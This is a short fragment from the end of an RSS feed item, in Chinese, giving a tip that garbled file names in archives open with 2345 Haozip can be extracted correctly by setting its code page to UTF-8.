&lt;li&gt;用的2345好压 直接解压不能解决此文件，，&lt;/li&gt;
&lt;li&gt;可以通过设置2345好压 的代码页 为UTF-8 来解压即可 （预览的时候还是乱码），不过解压出来就都正常了&lt;/li&gt;
&lt;/ol&gt;</description>
    </item>
    
  </channel>
</rss>